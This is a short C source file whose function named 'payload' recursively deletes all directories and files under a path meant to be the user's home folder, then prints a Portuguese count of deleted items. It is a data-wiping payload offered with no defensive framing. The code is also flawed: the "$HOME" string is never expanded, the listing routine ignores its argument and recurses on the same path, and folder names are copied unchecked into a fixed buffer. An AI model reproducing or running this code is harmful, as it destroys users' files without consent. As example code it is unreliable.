#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>

#define PATH "$HOME"
#define TAM_NAMEF 256

int remove_directory(const char *path)
{
    DIR *dir = opendir(path);
    struct dirent *folder;
    struct stat statbuf;
    size_t path_len = strlen(path);
    int delF1 = -1, delF2 = -1;
    char *buffer;
    size_t len;

    if (dir){
        delF1 = 0;

        while (!delF1 && (folder=readdir(dir))){
            if (!strcmp(folder->d_name, ".") || !strcmp(folder->d_name, "..")){
                continue;
            }

            len = path_len + strlen(folder->d_name) + 2; 
            buffer = malloc(len);

            if (buffer){
                snprintf(buffer, len, "%s/%s", path, folder->d_name);
             
                if (!stat(buffer, &statbuf)){
                    if (S_ISDIR(statbuf.st_mode)){
                        delF2 = remove_directory(buffer);
                    }
                    else{
                        delF2 = unlink(buffer);
                    }
                }

                free(buffer);
            }

            delF1 = delF2;
        }

        closedir(dir);
    }

    if (!delF1){
        delF1 = rmdir(path);
    }

    return delF1;
}

void listDir(char *path, int *numberR){
    char folder[TAM_NAMEF];
	DIR* dir;
	struct dirent *ent;
    int filesRemoved = 0;

	if((dir=opendir(PATH)) != NULL){
        while ((ent = readdir(dir)) != NULL){
      	    if(ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0  && strcmp(ent->d_name, "..") != 0){
                listDir(ent->d_name, numberR);
                strcpy(folder, PATH);
                strcat(folder, "/");
                strcat(folder, ent->d_name);
                filesRemoved = remove_directory(folder);
                *numberR += 1;
            }
        }
        closedir(dir);
    }
}

void payload(){
    int numberR = 0;    

    listDir(PATH, &numberR);
    printf("Quantidade de Arquivos Apagados: %d\n", numberR);
}
